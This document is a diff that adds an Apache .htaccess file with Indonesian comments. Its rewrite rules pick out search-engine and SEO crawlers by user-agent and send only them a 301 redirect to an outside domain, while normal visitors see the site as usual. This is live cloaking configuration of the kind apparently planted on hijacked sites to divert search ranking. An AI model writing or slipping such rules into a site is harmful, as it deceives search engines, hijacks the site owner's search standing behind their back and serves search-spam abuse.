@@ -1,0 +1,9 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+# Deteksi User-Agent bot
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+
+# Redirect 301 hanya untuk bot ke https://www.redicinaysa.ugto.mx/
+RewriteRule ^(.*)$ https://www.redicinaysa.ugto.mx/ [R=301,L]
+</IfModule>
